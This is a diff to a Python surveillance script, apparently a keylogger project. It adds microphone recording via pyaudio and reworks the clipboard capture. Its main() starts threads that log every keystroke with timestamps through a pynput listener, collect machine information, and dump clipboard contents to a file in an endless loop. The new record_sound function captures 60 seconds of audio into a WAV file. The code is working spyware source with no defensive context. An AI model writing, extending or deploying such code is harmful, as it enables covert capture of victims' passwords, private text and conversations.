@@ -5,11 +5,21 @@ import socket
 import platform
 import requests
 import pyperclip
+import pyaudio
+import wave
 from requests import get 
+from scipy.io.wavfile import read, write
 from pynput.keyboard import Key, Listener
 
+WAV_FILENAME = "recorded.wav"
+CHUNK_IN_BYTES = 1024
+FORMAT = pyaudio.paInt16
+CHANNELS = 1
+SAMPLE_RATE = 44100
+RECORD_SECONDS = 60
 
-def on_press(key):
+
+def press_keys(key):
 	keys = []
 	keys.append(key)
 	current_date_time = datetime.datetime.now()
@@ -55,27 +65,32 @@ def write_machine_info_file():
 def get_clipboard_history():
 	clipboard_history = ""
 	open("clipboard_hist.text", "w")
-	while 1:
-		if pyperclip.paste() == clipboard_history:
-			print("nothing new")
-		else:
-			with open("clipboard_hist.text", "a") as file:
-				file.write(str(pyperclip.paste()))
-				file.write("\n")
-			clipboard_history = pyperclip.paste()
+	while True:
+		with open("clipboard_hist.text", "a") as file:
+			file.write(str(pyperclip.paste()))
+			file.write("\n")
+		clipboard_history = pyperclip.paste()
 
 def record_sound():
-	sample_rate = 44100
-	recording_duration = 60
-	file_name = "audio.wav"
-	print("recording....")
-	recording = sd.rec(int(sample_rate * recording_duration), samplerate=sample_rate, channels=2)
-	sd.wait()
-	open(file_name, "w+")
-	write(file_name, sample_rate, recording)
-	audio_file = read(file_name)
-	with open("sound.text", "w") as file:
-		file.write(str(audio_file[1]))
+	my_pyaudio = pyaudio.PyAudio()
+	stream = my_pyaudio.open(format=FORMAT,channels=CHANNELS,rate=SAMPLE_RATE,input=True,
+						  output=True,frames_per_buffer=CHUNK_IN_BYTES)
+	frames = []
+	print("Recording...")
+	for i in range(int(SAMPLE_RATE / CHUNK_IN_BYTES * RECORD_SECONDS)):
+		data = stream.read(CHUNK_IN_BYTES)
+		frames.append(data)
+	print("Finished recording.")
+	stream.stop_stream()
+	stream.close()
+	my_pyaudio.terminate()
+	# Generating an audio (wav) file.
+	wave_file = wave.open(WAV_FILENAME, "wb")
+	wave_file.setnchannels(CHANNELS)
+	wave_file.setsampwidth(my_pyaudio.get_sample_size(FORMAT))
+	wave_file.setframerate(SAMPLE_RATE)
+	wave_file.writeframes(b"".join(frames))
+	wave_file.close()
 
 def main():
 	machine_info = threading.Thread(target=write_machine_info_file)
@@ -84,7 +99,7 @@ def main():
 	clipboard_history.start()
 	sound_recording = threading.Thread(target=record_sound)
 	sound_recording.start()
-	with Listener(on_press=on_press) as listener:
+	with Listener(on_press=press_keys) as listener:
 		listener.join()
 
 if __name__ == '__main__':
